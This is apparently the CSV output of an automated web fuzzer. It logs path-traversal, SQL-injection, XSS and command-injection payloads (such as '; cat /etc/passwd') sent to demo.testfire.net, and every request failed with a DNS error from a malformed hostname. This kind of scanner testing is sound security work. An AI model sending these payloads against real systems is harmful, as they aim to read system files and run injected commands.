payload,reflected,error
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fdddc975fd0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda3160f0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
' OR 127=127 --,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%27+OR+127%3D127+-- (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda315b20>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(84)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%2884%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda3158e0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #160,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%23160 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda380c20>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda314500>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #84,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%2384 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda3161b0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(103)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%28103%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fdddaaf4680>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2d3cb0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(118)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%28118%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2a8e60>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #112,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%23112 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda381550>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2d38c0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda5c62a0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(160)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%28160%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda314dd0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(159)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%28159%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda314920>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(38)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%2838%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda381100>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
' OR 153=153 --,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%27+OR+153%3D153+-- (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda381ee0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #151,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%23151 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda34bcb0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #165,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%23165 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda3489b0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda349880>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #71,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%2371 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda34a180>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #27,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%2327 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda34ac30>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2d3b30>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda34ab40>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(49)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%2849%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda349b20>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda3496a0>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
; cat /etc/passwd #188,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3B+cat+%2Fetc%2Fpasswd+%23188 (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda34be00>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(113)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%28113%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2d3290>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(23)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%2823%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda2d2c00>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda348d10>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
<script>alert(105)</script>,False,"HTTPConnectionPool(host='demo.testfire.net)', port=80): Max retries exceeded with url: /?input=%3Cscript%3Ealert%28105%29%3C%2Fscript%3E (Caused by NameResolutionError(""<urllib3.connection.HTTPConnection object at 0x7fddda349a30>: Failed to resolve 'demo.testfire.net)' ([Errno -2] Name or service not known)""))"
